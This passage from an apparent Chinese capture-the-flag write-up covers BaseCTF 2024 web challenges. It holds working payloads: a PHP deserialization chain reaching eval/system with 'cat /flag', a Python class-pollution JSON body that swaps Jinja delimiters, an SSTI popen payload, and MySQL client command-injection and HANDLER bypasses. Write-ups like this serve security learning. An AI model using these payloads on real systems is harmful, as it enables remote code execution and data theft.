</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/ctfer/i&#39;</span>,$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>username</span>)){
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;Hacker！&#39;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>C</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $c;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__toString</span>(){
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>c</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>c</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;C&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>T</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $t;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__call</span>($name,$args){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>t</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>t</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>F</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $f;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__get</span>($name){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>isset</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>f</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>f</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>E</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $e;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__isset</span>($name){
</span></span><span style=display:flex><span>        ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>e</span>)();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>R</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $r;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__invoke</span>(){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>eval</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>r</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Hacker</span>();
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>end</span><span style=color:#f92672>=&amp;</span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>username</span>;
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>start</span><span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>C</span>;
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>start</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>c</span><span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>T</span>;
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>start</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>c</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>t</span><span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>F</span>;
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>start</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>c</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>t</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>f</span><span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>E</span>;
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>start</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>c</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>t</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>f</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>e</span><span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>R</span>;
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>start</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>c</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>t</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>f</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>e</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>r</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;system(&#39;ls&#39;);&#34;</span>;
</span></span><span style=display:flex><span>$orange<span style=color:#f92672>=</span><span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#39;1&#39;</span><span style=color:#f92672>=&gt;</span>$exp,<span style=color:#e6db74>&#39;2&#39;</span><span style=color:#f92672>=&gt;</span><span style=color:#66d9ef>null</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>serialize</span>($orange);
</span></span></code></pre></div><p>得到的答案需要在本地测试一下前面的内容</p><p><img alt=ez loading=lazy src=/posts/ctf/basectf2024/ez.png></p><p>然后前面的需要进行字符串逃逸，这里不再赘婿，可以看我<a href=https://0ran9ewww.github.io/2024/08/28/nepctf/nepctf2024/#PHP-MASTER>文章</a>,</p><p><img alt=ez-1 loading=lazy src=/posts/ctf/basectf2024/ez-1.png></p><p>测出长度是</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>?substr<span style=color:#f92672>=</span>%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%9f
</span></span><span style=display:flex><span>&amp;ez<span style=color:#f92672>[</span>ser.from_you<span style=color:#f92672>=</span>a:2:<span style=color:#f92672>{</span>i:1;O:6:<span style=color:#e6db74>&#34;Hacker&#34;</span>:3:<span style=color:#f92672>{</span>s:5:<span style=color:#e6db74>&#34;start&#34;</span>;O:1:<span style=color:#e6db74>&#34;C&#34;</span>:1:<span style=color:#f92672>{</span>s:1:<span style=color:#e6db74>&#34;c&#34;</span>;O:1:<span style=color:#e6db74>&#34;T&#34;</span>:1:<span style=color:#f92672>{</span>s:1:<span style=color:#e6db74>&#34;t&#34;</span>;O:1:<span style=color:#e6db74>&#34;F&#34;</span>:1:<span style=color:#f92672>{</span>s:1:<span style=color:#e6db74>&#34;f&#34;</span>;O:1:<span style=color:#e6db74>&#34;E&#34;</span>:1:<span style=color:#f92672>{</span>s:1:<span style=color:#e6db74>&#34;e&#34;</span>;O:1:<span style=color:#e6db74>&#34;R&#34;</span>:1:<span style=color:#f92672>{</span>s:1:<span style=color:#e6db74>&#34;r&#34;</span>;s:15:<span style=color:#e6db74>&#34;system(&#39;ls /&#39;);&#34;</span>;<span style=color:#f92672>}}}}}</span>s:3:<span style=color:#e6db74>&#34;end&#34;</span>;s:6:<span style=color:#e6db74>&#34;hacker&#34;</span>;s:8:<span style=color:#e6db74>&#34;username&#34;</span>;R:9;<span style=color:#f92672>}</span>i:1;N;<span style=color:#f92672>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>?substr<span style=color:#f92672>=</span>%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%9f
</span></span><span style=display:flex><span>&amp;ez<span style=color:#f92672>[</span>ser.from_you<span style=color:#f92672>=</span>a:2:<span style=color:#f92672>{</span>i:1;O:6:<span style=color:#e6db74>&#34;Hacker&#34;</span>:3:<span style=color:#f92672>{</span>s:5:<span style=color:#e6db74>&#34;start&#34;</span>;O:1:<span style=color:#e6db74>&#34;C&#34;</span>:1:<span style=color:#f92672>{</span>s:1:<span style=color:#e6db74>&#34;c&#34;</span>;O:1:<span style=color:#e6db74>&#34;T&#34;</span>:1:<span style=color:#f92672>{</span>s:1:<span style=color:#e6db74>&#34;t&#34;</span>;O:1:<span style=color:#e6db74>&#34;F&#34;</span>:1:<span style=color:#f92672>{</span>s:1:<span style=color:#e6db74>&#34;f&#34;</span>;O:1:<span style=color:#e6db74>&#34;E&#34;</span>:1:<span style=color:#f92672>{</span>s:1:<span style=color:#e6db74>&#34;e&#34;</span>;O:1:<span style=color:#e6db74>&#34;R&#34;</span>:1:<span style=color:#f92672>{</span>s:1:<span style=color:#e6db74>&#34;r&#34;</span>;s:20:<span style=color:#e6db74>&#34;system(&#39;cat /flag&#39;);&#34;</span>;<span style=color:#f92672>}}}}}</span>s:3:<span style=color:#e6db74>&#34;end&#34;</span>;s:6:<span style=color:#e6db74>&#34;hacker&#34;</span>;s:8:<span style=color:#e6db74>&#34;username&#34;</span>;R:9;<span style=color:#f92672>}</span>i:1;N;<span style=color:#f92672>}</span>
</span></span></code></pre></div><p>cx师傅又让我学到了</p><h3 id=jinja-mark>Jinja Mark</h3><p>在/flag里面可以fuzz一下得到提示,不确定这个是动态还是静态的，最好自己bp跑一下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>lucky_number<span style=color:#f92672>=</span><span style=color:#ae81ff>5346</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>BLACKLIST_IN_index <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;{&#39;</span>,<span style=color:#e6db74>&#39;}&#39;</span>]
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>merge</span>(src, dst):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> k, v <span style=color:#f92672>in</span> src<span style=color:#f92672>.</span>items():
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> hasattr(dst, <span style=color:#e6db74>&#39;__getitem__&#39;</span>):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> dst<span style=color:#f92672>.</span>get(k) <span style=color:#f92672>and</span> type(v) <span style=color:#f92672>==</span> dict:
</span></span><span style=display:flex><span>                merge(v, dst<span style=color:#f92672>.</span>get(k))
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>                dst[k] <span style=color:#f92672>=</span> v
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> hasattr(dst, k) <span style=color:#f92672>and</span> type(v) <span style=color:#f92672>==</span> dict:
</span></span><span style=display:flex><span>            merge(v, getattr(dst, k))
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            setattr(dst, k, v)
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/magic&#39;</span>,methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>, <span style=color:#e6db74>&#39;GET&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>pollute</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;POST&#39;</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>is_json:
</span></span><span style=display:flex><span>            merge(json<span style=color:#f92672>.</span>loads(request<span style=color:#f92672>.</span>data), instance)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;这个魔术还行吧&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;我要json的魔术&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;记得用POST方法把魔术交上来&#34;</span>
</span></span></code></pre></div><p>得到了提示，index禁用了花括号，然后这是一个python原生类的题目~暂时没思路了，是要通过原生类进行ssti，还是通过这个进行简单的花括号绕过呢</p><p>续言：没错就是进行简单的花括号绕过，用其他代替就好了<code>jinja_env</code> 配置了 Jinja2 的模板引擎环境，通过修改 <code>variable_start_string</code> 和 <code>variable_end_string</code> 来控制模板变量的起始和结束符号。只是我知识面比较窄而已，利用post发包</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;__init__&#34;</span>: {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;__globals__&#34;</span>: {
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;app&#34;</span>: {
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;jinja_env&#34;</span>: {
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;variable_start_string&#34;</span>: <span style=color:#e6db74>&#34;&lt;&lt;&#34;</span>,
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;variable_end_string&#34;</span>: <span style=color:#e6db74>&#34;&gt;&gt;&#34;</span>
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Content-Type: application/json
</span></span></code></pre></div><p>最后直接在对应的界面进行简单的ssti注入就行了</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>&lt;&lt;<span style=color:#e6db74>&#34;&#34;</span>.__class__.__bases__<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>.__subclasses__<span style=color:#f92672>()[</span>132<span style=color:#f92672>]</span>.__init__.__globals__<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;popen&#39;</span><span style=color:#f92672>](</span><span style=color:#e6db74>&#39;cat flag&#39;</span><span style=color:#f92672>)</span>.read<span style=color:#f92672>()</span>&gt;&gt;
</span></span></code></pre></div><h3 id=back-to-the-future>Back to the future</h3><p>一时间没想起来怎么写，在nss刷题的时候突然就想起来了，默认去看一下robots.txt，通常不要扫描的都在这里，提醒的是.git然后用githacker这个工具进行恢复，利用git reset &ndash;hard 第二个恢复flag</p><p>续：有师傅和我说githack不能直接得到，我用的是gitdumper下来再用githacker的，也可以按这么来。</p><h3 id=rce-or-sql-inject>RCE or Sql Inject</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span>$sql <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;sql&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/se|ec|;|@|del|into|outfile/i&#39;</span>, $sql)) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;你知道的，不可能有sql注入&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/&#34;|\$|`|\\\\/i&#39;</span>, $sql)) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;你知道的，不可能有RCE&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>$query <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;mysql -u root -p123456 -e </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>use ctf;select &#39;ctfer! You can</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#39;t succeed this time! hahaha&#39;; -- &#34;</span> <span style=color:#f92672>.</span> $sql <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>system</span>($query); <span style=color:#a6e22e>ctfer</span><span style=color:#f92672>!</span> <span style=color:#a6e22e>You</span> <span style=color:#a6e22e>can</span><span style=color:#e6db74>&#39;t succeed this time! hahaha ctfer! You can&#39;</span><span style=color:#a6e22e>t</span> <span style=color:#a6e22e>succeed</span> <span style=color:#66d9ef>this</span> <span style=color:#a6e22e>time</span><span style=color:#f92672>!</span> <span style=color:#a6e22e>hahaha</span>
</span></span></code></pre></div><p>学习学习吧，给的hint告诉了这题其实已经是rce的题目了</p><p>R! C! E! mysql远程连接和命令行操作是不是有些区别呢 输个问号看看?</p><p>本地mysql连接输入?看看有一行可以注意到（我在物理机测试上并没有，可能是版本问题，之后会在vps上测一下）</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-mysql data-lang=mysql><span style=display:flex><span><span style=color:#a6e22e>system</span> (<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>!</span>) Execute a system shell command.
</span></span></code></pre></div><p>那么就是使用system或者<code>\!</code>执行一个system shell命令</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>?sql<span style=color:#f92672>=</span>%0asystem env
</span></span></code></pre></div><p>冷知识＋1</p><h3 id=sql-inject-or-rce>Sql Inject or RCE</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>&lt;?php
</span></span><span style=display:flex><span>highlight_file<span style=color:#f92672>(</span>__FILE__<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>$sql <span style=color:#f92672>=</span> $_GET<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;sql&#39;</span><span style=color:#f92672>]</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>preg_match<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;/se|ec|st|;|@|delete|into|outfile/i&#39;</span>, $sql<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    die<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;你知道的，不可能有sql注入&#34;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>preg_match<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;/&#34;|\$|`|\\\\/i&#39;</span>, $sql<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    die<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;你知道的，不可能有RCE&#34;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>$query <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;mysql -u root -p123456 -e \&#34;use ctf;select &#39;ctfer! You can\\&#39;t succeed this time! hahaha&#39;; -- &#34;</span> . $sql . <span style=color:#e6db74>&#34;\&#34;&#34;</span>;
</span></span><span style=display:flex><span>system<span style=color:#f92672>(</span>$query<span style=color:#f92672>)</span>; ctfer! You can<span style=color:#e6db74>&#39;t succeed this time! hahaha ctfer! You can&#39;</span>t succeed this time! hahaha
</span></span></code></pre></div><p>在上一题的基础上过滤了system，并且把过滤的del变成了delete，所以可以考虑从del这方面入手。</p><p><code>DELIMITER</code> 是一个用于改变 SQL 语句结束符的命令，通常用于定义存储过程、触发器或函数时，因为这些语句内部会使用 <code>;</code>，而 <code>;</code> 也是 MySQL 默认的语句结束符。简单的说可以把DELIMITER当作；，但是我们可以自定义这个。</p><p>handler是MySQL特有的，可以逐行浏览某个表中的数据，格式：</p><p>打开表：HANDLER 表名 OPEN ;</p><p>查看数据： HANDLER 表名 READ next;</p><p>关闭表： HANDLER 表名 READ CLOSE；</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>?sql<span style=color:#f92672>=</span>%0adelimiter orange%0a handler flag openorange%0ahandler flag read next
</span></span></code></pre></div><p>实际执行的是</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>delimiter</span> orange
</span></span><span style=display:flex><span><span style=color:#66d9ef>handler</span> flag openorange
</span></span><span style=display:flex><span><span style=color:#66d9ef>handler</span> flag <span style=color:#66d9ef>read</span> <span style=color:#66d9ef>next</span>
</span></span></code></pre></div><h3 id=lucky-number>Lucky Number</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask,request,render_template_string,render_template
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> jinja2 <span style=color:#f92672>import</span> Template
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> json
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> heaven
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>merge</span>(src, dst):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> k, v <span style=color:#f92672>in</span> src<span style=color:#f92672>.</span>items():
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> hasattr(dst, <span style=color:#e6db74>&#39;__getitem__&#39;</span>):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> dst<span style=color:#f92672>.</span>get(k) <span style=color:#f92672>and</span> type(v) <span style=color:#f92672>==</span> dict:
</span></span><span style=display:flex><span>                merge(v, dst<span style=color:#f92672>.</span>get(k))
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>                dst[k] <span style=color:#f92672>=</span> v
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> hasattr(dst, k) <span style=color:#f92672>and</span> type(v) <span style=color:#f92672>==</span> dict:
</span></span><span style=display:flex><span>            merge(v, getattr(dst, k))
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            setattr(dst, k, v)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>cls</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__init__</span>(self):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>pass</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>instance <span style=color:#f92672>=</span> cls()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>BLACKLIST_IN_index <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;{&#39;</span>,<span style=color:#e6db74>&#39;}&#39;</span>]
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>is_json</span>(data):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        json<span style=color:#f92672>.</span>loads(data)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>ValueError</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/m4G1c&#39;</span>,methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>, <span style=color:#e6db74>&#39;GET&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>pollute</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;POST&#39;</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>is_json:
</span></span><span style=display:flex><span>            merge(json<span style=color:#f92672>.</span>loads(request<span style=color:#f92672>.</span>data), instance)
</span></span><span style=display:flex><span>            result <span style=color:#f92672>=</span> heaven<span style=color:#f92672>.</span>create()
</span></span><span style=display:flex><span>            message <span style=color:#f92672>=</span> result[<span style=color:#e6db74>&#34;message&#34;</span>]
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;这个魔术还行吧</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34; + message</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;我要json的魔术&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;记得用POST方法把魔术交上来&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#heaven.py</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>create</span>(kon<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Kon&#34;</span>, pure<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Pure&#34;</span>, <span style=color:#f92672>*</span>, confirm<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> confirm <span style=color:#f92672>and</span> <span style=color:#e6db74>&#34;lucky_number&#34;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> create<span style=color:#f92672>.</span>__kwdefaults__:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> {<span style=color:#e6db74>&#34;message&#34;</span>: <span style=color:#e6db74>&#34;嗯嗯，我已经知道你要创造东西了，但是你怎么不告诉我要创造什么？&#34;</span>, <span style=color:#e6db74>&#34;lucky_number&#34;</span>: <span style=color:#e6db74>&#34;nope&#34;</span>}
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> confirm <span style=color:#f92672>and</span> <span style=color:#e6db74>&#34;lucky_number&#34;</span> <span style=color:#f92672>in</span> create<span style=color:#f92672>.</span>__kwdefaults__:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> {<span style=color:#e6db74>&#34;message&#34;</span>: <span style=color:#e6db74>&#34;这是你的lucky_number，请拿好，去/check下检查一下吧&#34;</span>, <span style=color:#e6db74>&#34;lucky_number&#34;</span>: create<span style=color:#f92672>.</span>__kwdefaults__[<span style=color:#e6db74>&#34;lucky_number&#34;</span>]}
</span></span><span style=display:flex><span>
